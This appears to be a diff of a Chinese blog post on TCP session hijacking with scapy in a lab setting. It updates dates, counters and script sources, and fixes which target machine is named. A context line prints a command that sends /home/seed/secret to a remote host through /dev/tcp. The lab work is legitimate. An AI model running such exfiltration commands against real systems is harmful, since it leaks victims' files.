@@ -128,7 +128,7 @@
 <meta property="og:image" content="https://mingkwind.github.io/images/loading.gif">
 <meta property="og:image" content="https://mingkwind.github.io/images/loading.gif">
 <meta property="article:published_time" content="2020-04-01T10:59:42.000Z">
-<meta property="article:modified_time" content="2022-04-09T15:16:20.628Z">
+<meta property="article:modified_time" content="2022-04-26T14:23:23.717Z">
 <meta property="article:author" content="Mingkwind">
 <meta property="article:tag" content="scapy">
 <meta name="twitter:card" content="summary">
@@ -517,9 +517,9 @@
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331221625653.png" alt="image-20200331221625653"></p>
 <p>靶机A输入</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;seed&#x2F;secret  &gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.121&#x2F;9090</span><br></pre></td></tr></table></figure></div>
-<p>之后靶机A显示</p>
+<p>之后靶机B显示</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331223556494.png" alt="image-20200331223556494"></p>
-<p>信息被重定向至靶机A的9090端口</p>
+<p>信息被重定向至靶机B的9090端口</p>
 <p>利用上述原理通过scapy劫持靶机B与A之间的telnet通信</p>
 <p>靶机B向靶机A发起telnet连接，在A端收到的最后一个TCP报文如下</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331225425727.png" alt="image-20200331225425727"></p>
@@ -591,12 +591,14 @@
   <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
   
   <!-- JS库 sweetalert 可修改路径 -->
-  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <!-- <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script> -->
+  <script src="http://libs.baidu.com/jquery/2.0.0/jquery.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+
   <p><span>本文标题:</span><a href="/posts/5acb07a3/">scapy实现TCP Attacks</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 Mingkwind 的个人博客">Mingkwind</a></p>
   <p><span>发布时间:</span>2020年04月01日 - 18:59</p>
-  <p><span>最后更新:</span>2022年04月09日 - 23:16</p>
+  <p><span>最后更新:</span>2022年04月26日 - 22:23</p>
   <p><span>原始链接:</span><a href="/posts/5acb07a3/" title="scapy实现TCP Attacks">https://mingkwind.github.io/posts/5acb07a3/</a>
     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://mingkwind.github.io/posts/5acb07a3/"  aria-label="复制成功！"></i></span>
   </p>
@@ -720,7 +722,7 @@
                 
 				<a href="/archives/">
               
-                  <span class="site-state-item-count">70</span>
+                  <span class="site-state-item-count">73</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -731,7 +733,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-count">22</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -742,7 +744,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">25</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -1356,7 +1358,7 @@
         }
       });
     </script>
-    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript" src="//mathjax.josephjctang.com/MathJax.js?config=TeX-MML-AM_HTMLorMML"></script>
   
 
 
